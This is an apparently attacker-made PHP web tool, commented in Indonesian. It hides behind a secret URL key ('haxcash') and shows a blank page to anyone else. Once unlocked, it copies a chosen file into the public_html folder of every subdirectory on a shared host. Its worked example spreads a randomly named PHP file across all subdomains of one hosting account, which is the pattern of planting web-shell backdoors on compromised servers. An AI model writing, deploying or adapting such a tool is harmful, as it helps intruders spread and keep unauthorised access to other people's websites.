<?php
/**
 * Mass File Copy Tool
 * Copy file ke semua direktori dalam target directory
 * Access: ?key=haxcash
 */

// Cek parameter key
if (!isset($_GET['key']) || $_GET['key'] !== 'haxcash') {
    // Blank page jika tidak ada key atau key salah
    exit;
}

$message = '';
$messageType = '';
$logs = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $fileName = trim($_POST['file_name'] ?? '');
    $sourcePath = rtrim(trim($_POST['source_path'] ?? ''), '/');
    $targetDir = rtrim(trim($_POST['target_dir'] ?? ''), '/');
    $copyPath = trim($_POST['copy_path'] ?? '');
    
    // Gabungkan source path + file name
    $sourceFile = $sourcePath . '/' . $fileName;
    
    // Validasi input
    if (empty($fileName) || empty($sourcePath) || empty($targetDir) || empty($copyPath)) {
        $message = 'Semua field harus diisi!';
        $messageType = 'error';
    } elseif (!file_exists($sourceFile)) {
        $message = "File sumber tidak ditemukan: $sourceFile";
        $messageType = 'error';
    } elseif (!is_dir($targetDir)) {
        $message = "Directory tujuan tidak ditemukan: $targetDir";
        $messageType = 'error';
    } else {
        // Scan semua directory di target
        $directories = array_filter(glob($targetDir . '/*'), 'is_dir');
        
        if (empty($directories)) {
            $message = "Tidak ada subdirectory di: $targetDir";
            $messageType = 'error';
        } else {
            $successCount = 0;
            $errorCount = 0;
            
            foreach ($directories as $dir) {
                $dirName = basename($dir);
                // Gabungkan path: directory + copy_path
                // copy_path sudah include / di awal, contoh: /public_html/file.txt atau /file.txt
                $destinationPath = $dir . $copyPath;
                
                // Buat directory jika belum ada
                $destDir = dirname($destinationPath);
                if (!is_dir($destDir)) {
                    if (!@mkdir($destDir, 0755, true)) {
                        $logs[] = [
                            'status' => 'error',
                            'dir' => $dirName,
                            'message' => "Gagal membuat directory: $destDir"
                        ];
                        $errorCount++;
                        continue;
                    }
                }
                
                // Copy file
                if (@copy($sourceFile, $destinationPath)) {
                    $logs[] = [
                        'status' => 'success',
                        'dir' => $dirName,
                        'message' => "Berhasil copy ke: $destinationPath"
                    ];
                    $successCount++;
                } else {
                    $logs[] = [
                        'status' => 'error',
                        'dir' => $dirName,
                        'message' => "Gagal copy ke: $destinationPath"
                    ];
                    $errorCount++;
                }
            }
            
            $message = "Proses selesai! Berhasil: $successCount, Gagal: $errorCount";
            $messageType = $errorCount > 0 ? 'warning' : 'success';
        }
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mass File Copy Tool</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            padding: 20px;
            color: #eee;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        h1 {
            text-align: center;
            margin-bottom: 30px;
            color: #00d9ff;
            text-shadow: 0 0 10px rgba(0, 217, 255, 0.5);
        }
        .card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 20px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #00d9ff;
            font-weight: 500;
        }
        .hint {
            font-size: 12px;
            color: #888;
            margin-top: 5px;
        }
        input[type="text"] {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            background: rgba(0, 0, 0, 0.3);
            color: #fff;
            font-size: 14px;
            transition: all 0.3s;
        }
        input[type="text"]:focus {
            outline: none;
            border-color: #00d9ff;
            box-shadow: 0 0 10px rgba(0, 217, 255, 0.3);
        }
        input[type="text"]::placeholder {
            color: #666;
        }
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #00d9ff 0%, #0099cc 100%);
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0, 217, 255, 0.4);
        }
        .message {
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-weight: 500;
        }
        .message.success {
            background: rgba(0, 255, 136, 0.2);
            border: 1px solid #00ff88;
            color: #00ff88;
        }
        .message.error {
            background: rgba(255, 68, 68, 0.2);
            border: 1px solid #ff4444;
            color: #ff4444;
        }
        .message.warning {
            background: rgba(255, 187, 0, 0.2);
            border: 1px solid #ffbb00;
            color: #ffbb00;
        }
        .logs {
            max-height: 400px;
            overflow-y: auto;
        }
        .log-item {
            padding: 10px 15px;
            margin-bottom: 8px;
            border-radius: 6px;
            font-size: 13px;
            font-family: monospace;
        }
        .log-item.success {
            background: rgba(0, 255, 136, 0.1);
            border-left: 3px solid #00ff88;
        }
        .log-item.error {
            background: rgba(255, 68, 68, 0.1);
            border-left: 3px solid #ff4444;
        }
        .log-dir {
            color: #00d9ff;
            font-weight: 600;
        }
        .example-box {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
        }
        .example-box h3 {
            color: #ffbb00;
            margin-bottom: 10px;
            font-size: 14px;
        }
        .example-box code {
            display: block;
            color: #00ff88;
            font-size: 12px;
            line-height: 1.8;
        }
        .divider {
            border-top: 1px dashed rgba(255,255,255,0.2);
            margin: 15px 0;
            padding-top: 15px;
        }
        .source-preview {
            background: rgba(0, 217, 255, 0.1);
            border: 1px solid rgba(0, 217, 255, 0.3);
            border-radius: 6px;
            padding: 10px 15px;
            margin-top: 10px;
            font-family: monospace;
            font-size: 13px;
            color: #00d9ff;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🗂️ Mass File Copy Tool</h1>
        
        <?php if ($message): ?>
            <div class="message <?php echo $messageType; ?>">
                <?php echo htmlspecialchars($message); ?>
            </div>
        <?php endif; ?>
        
        <div class="card">
            <form method="POST" id="copyForm">
                <div class="form-group">
                    <label>📝 File Name</label>
                    <input type="text" name="file_name" id="fileName"
                           placeholder="hfvse0.php"
                           value="<?php echo htmlspecialchars($_POST['file_name'] ?? ''); ?>">
                    <div class="hint">Nama file yang akan di-copy</div>
                </div>
                
                <div class="form-group">
                    <label>📂 Source Path (Directory)</label>
                    <input type="text" name="source_path" id="sourcePath"
                           placeholder="/home/shreevi1/public_html"
                           value="<?php echo htmlspecialchars($_POST['source_path'] ?? ''); ?>">
                    <div class="hint">Path directory tempat file berada (tanpa nama file)</div>
                    <div class="source-preview" id="sourcePreview">
                        Full path: <span id="fullPathPreview">-</span>
                    </div>
                </div>
                
                <div class="divider"></div>
                
                <div class="form-group">
                    <label>📁 Target Directory</label>
                    <input type="text" name="target_dir" 
                           placeholder="/home/shreevi1"
                           value="<?php echo htmlspecialchars($_POST['target_dir'] ?? ''); ?>">
                    <div class="hint">Directory yang berisi subdirectory tujuan</div>
                </div>
                
                <div class="form-group">
                    <label>📋 Copy Path (dengan nama file)</label>
                    <input type="text" name="copy_path" 
                           placeholder="/public_html/hfvse0.php atau /hfvse0.php"
                           value="<?php echo htmlspecialchars($_POST['copy_path'] ?? ''); ?>">
                    <div class="hint">Path relatif dari setiap subdirectory + nama file tujuan</div>
                </div>
                
                <button type="submit">🚀 Mulai Copy</button>
            </form>
            
            <div class="example-box">
                <h3>📌 Contoh Penggunaan:</h3>
                <code>
                    File Name: hfvse0.php<br>
                    Source Path: /home/shreevi1/public_html<br>
                    → Full Source: /home/shreevi1/public_html/hfvse0.php<br><br>
                    
                    Target Directory: /home/shreevi1<br>
                    Copy Path: /public_html/hfvse0.php<br><br>
                    
                    Hasil: File akan di-copy ke:<br>
                    → /home/shreevi1/subdo1.domain.com/public_html/hfvse0.php<br>
                    → /home/shreevi1/subdo2.domain.com/public_html/hfvse0.php<br>
                    → dst...
                </code>
            </div>
        </div>
        
        <?php if (!empty($logs)): ?>
            <div class="card">
                <h2 style="margin-bottom: 20px; color: #00d9ff;">📋 Log Proses</h2>
                <div class="logs">
                    <?php foreach ($logs as $log): ?>
                        <div class="log-item <?php echo $log['status']; ?>">
                            <span class="log-dir">[<?php echo htmlspecialchars($log['dir']); ?>]</span>
                            <?php echo htmlspecialchars($log['message']); ?>
                        </div>
                    <?php endforeach; ?>
                </div>
            </div>
        <?php endif; ?>
    </div>
    
    <script>
        // Live preview full path
        const fileName = document.getElementById('fileName');
        const sourcePath = document.getElementById('sourcePath');
        const fullPathPreview = document.getElementById('fullPathPreview');
        
        function updatePreview() {
            const name = fileName.value.trim();
            const path = sourcePath.value.trim().replace(/\/+$/, '');
            
            if (name && path) {
                fullPathPreview.textContent = path + '/' + name;
            } else if (path) {
                fullPathPreview.textContent = path + '/[nama file]';
            } else if (name) {
                fullPathPreview.textContent = '[path]/' + name;
            } else {
                fullPathPreview.textContent = '-';
            }
        }
        
        fileName.addEventListener('input', updatePreview);
        sourcePath.addEventListener('input', updatePreview);
        
        // Initial preview
        updatePreview();
    </script>
</body>
</html>